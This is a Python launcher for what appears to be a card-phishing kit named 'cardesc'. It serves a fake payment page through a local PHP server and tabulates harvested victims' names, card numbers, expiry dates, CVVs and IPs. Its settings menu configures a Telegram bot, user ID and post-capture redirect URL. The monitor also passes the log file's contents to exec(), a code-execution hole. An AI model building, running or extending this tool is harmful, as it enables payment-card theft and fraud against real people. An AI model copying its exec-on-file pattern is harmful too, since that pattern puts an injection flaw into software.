import os, time, json
import requests, webbrowser
 
from multiprocessing import Process
from prettytable import PrettyTable
import subprocess

class Alpha:
    def __call__(self, ports):
        try:
            os.system(f"cd dist && php -S localhost:{ports}")
        except Exception as orange:
            print(f"[!] Error starting PHP server: {orange}")

class Delpha:
    def __call__(self, ports):
        while True:
            try:
                os.system('clear || cls')
                print(f"[PHP] Local Server 'http://localhost:{ports}' run !\n  |")
                x = PrettyTable()
                x.field_names = ['os', 'name', 'number', 'date', 'cvv', 'ip', 'send bot']
                try:
                    with open('dist/details/log.log', 'r') as log_file:
                        exec(log_file.read())
                except:
                    print("[!] Error reading log file")
                print(x)
                time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Stopping server monitor")
                break
            except Exception as orange:
                print(f"[!] Error in server monitor: {orange}")
                break

def update_check(meta):
    try:
        print("[>] Checking for updates...")
        rqst = requests.get(f"{meta['url']}", timeout=5)
        if rqst.status_code == 200:
            json_data = json.loads(rqst.text)
            gh_version = json_data['version']
            if str(gh_version) > meta['version']:
                print(f'\n[>] New Update Available: {gh_version}')
                print(' | Details: https://github.com/oldnum/cardesc')
                return True
        return False
    except Exception as orange:
        print(f'[>] Update check failed: {orange}')
        return True

def perform_update():
    try:
        print("[>] Starting Auto Update")
        os.system("git checkout . && git pull")
        print("\n[>] Successfully updated cardesc")
        print("[>] Author @oldnum thanks you for being with us :>")
        time.sleep(2)
        return True
    except Exception as orange:
        print(f"[!] Update failed: {orange}")
        print(' | -> Reinstall command: cd && rm -rf cardesc && git clone https://github.com/oldnum/cardesc && cd cardesc')
        return False

def print_logo(meta):
    return f"""\n
┌─┐┌─┐┬─┐┌┬┐┌─┐┌─┐┌─┐
│  ├─┤├┬┘ ││├┤ └─┐│  
└─┘┴ ┴┴└──┴┘└─┘└─┘└─┘
[>] Version: {meta.get('version')} 
 |-> Type: {meta.get('type')} 
[>] Donate: {len(meta['donate'])} options
 |-> btc: {meta.get('donate', {}).get('btc')}          
 |-> eth: {meta.get('donate', {}).get('eth')}
 |-> ltc: {meta.get('donate', {}).get('ltc')} 
[>] Support: {meta.get('telegram')}
 |-> Forewarned is forearmed :>\n"""

def print_history(meta):
    os.system('clear || cls')
    print(print_logo(meta))
    try:
        with open('result.log', 'r') as result_file:
            print(result_file.read())
    except FileNotFoundError:
        print("[!] Result log not found")

def card_pay(meta):
    try:
        ports = int(input("[>] Enter port number (default 8080): ") or 8080)
        a = Alpha()
        b = Delpha()
        p1 = Process(target=a, args=(ports,))
        p2 = Process(target=b, args=(ports,))
        p1.start()
        p2.start()
        p1.join()
        p2.join()
    except ValueError:
        print("[!] Invalid port number, using default (8080)")
        card_pay(meta)
    except Exception as orange:
        print(f"[!] Error starting payment system: {orange}")

def open_settings(meta, setting_url):
    os.system('clear || cls')
    print(print_logo(meta))
    try:
        with open(setting_url, 'r', encoding='utf8') as file:
            data_key = json.load(file)
        
        print("[1] Change Telegram bot API key\n[2] Change Telegram user ID\n[3] Change redirect URL\n[0] Exit")
        choice = input("\n[>] Enter option number: ").strip()

        if choice == '1':
            new_api = input("[>] Enter new Telegram bot API key: ")
            data_key['api_bot'] = new_api
        elif choice == '2':
            new_id = input("[>] Enter new Telegram user ID: ")
            data_key['id_user'] = new_id
        elif choice == '3':
            new_url = input("[>] Enter new redirect URL: ")
            with open("dist/details/location.location", 'w') as f:
                f.write(new_url)
        elif choice in ['0', '']:
            return

        if choice in ['1', '2']:
            with open(setting_url, 'w', encoding='utf-8') as f:
                json.dump(data_key, f, ensure_ascii=False, indent=2)
            print("[>] Settings saved successfully")
        
    except Exception as orange:
        print(f"[!] Error in settings: {orange}")

def show_help(meta):
    os.system('clear || cls')
    print(print_logo(meta))
    print("[>] Join me on Telegram for activation token and other tools\n | -> @oldnum\n")
    try:
        webbrowser.open(f"https://{meta['telegram']}", new=2)
    except:
        print(f"[!] Please manually visit: https://{meta['telegram']}")

def main():
    # Load metadata
    try:
        with open('info/metadata.json', 'r') as data_file:
            meta = json.load(data_file)
    except FileNotFoundError:
        print("[!] Metadata file not found")
        return

    # Clear log
    try:
        with open("dist/details/log.log", "w") as log_file:
            pass
    except:
        print("[!] Could not clear log file")

    # Check and set default location
    try:
        with open("dist/details/location.location", 'r') as file:
            content = file.read()
        if not content:
            with open("dist/details/location.location", 'w') as file:
                file.write("https://google.com")
    except:
        print("[!] Error handling location file")

    # Check for updates
    if update_check(meta):
        if not perform_update():
            return

    # Check PHP installation
    try:
        result = subprocess.run(['php', '--version'], capture_output=True, text=True)
        if result.returncode != 0:
            raise FileNotFoundError
    except FileNotFoundError:
        print("[!] PHP not found. Please install PHP:")
        print(" | -> Windows: https://monovm.com/blog/install-php-on-windows/")
        print(" | -> Linux: https://www.geeksforgeeks.org/how-to-install-php-on-linux/")
        return

    # Main menu
    os.system('clear || cls')
    print(print_logo(meta))
    print("[0] View History\n[1] Start Payment Page\n[2] Settings\n[3] Help\n[4] AI Assistant\n")
    
    try:
        choice = input("[>] Select option: ").strip()
        if choice == '0':
            print_history(meta)
        elif choice == '1':
            card_pay(meta)
        elif choice == '2':
            open_settings(meta, 'dist/details/settings.json')
        elif choice == '3':
            show_help(meta)
        elif choice == '4':
            import assistant
            assistant.main()
    except KeyboardInterrupt:
        print("\n[>] Goodbye my friend ! Remember Forewarned is forearmed :>")
    except Exception as orange:
        print(f"[!] Error: {orange}")

if __name__ == '__main__':
    main()